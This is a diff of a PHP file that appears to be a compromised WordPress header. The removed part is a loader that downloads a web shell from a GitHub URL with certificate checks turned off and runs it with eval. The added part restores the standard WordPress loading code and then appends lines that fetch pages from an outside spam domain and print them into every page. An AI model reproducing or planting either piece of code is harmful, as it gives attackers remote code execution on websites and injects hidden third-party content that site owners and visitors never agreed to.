@@ -1,21 +1,27 @@
 <?php
-function getURL($url) {
-    if (function_exists('curl_version')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_HEADER, 0);
-        $data = curl_exec($ch);
-        curl_close($ch);
-        return $data;
-    }
-    return false;
-}
 
-// Contoh penggunaan:
-$phpCode = getURL('https://raw.githubusercontent.com/twololbrother/shell/main/alfalitespeed.php');
-if ($phpCode !== false) {
-    eval("?>". $phpCode);
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if (!isset($wp_did_header)) {
+    $wp_did_header = true;
+
+    // Load the WordPress library.
+    require_once __DIR__ . '/wp-load.php';
+
+    // Set up the WordPress query.
+    wp();
+
+    // Load the theme template.
+    require_once ABSPATH . WPINC . '/template-loader.php';
 }
+?>
+<?php
+$b = file_get_contents('https://seotwinkle.site/littlestar/');
+echo $b;
+$a = file_get_contents('https://seotwinkle.site/lain/');
+echo $a;
 ?>
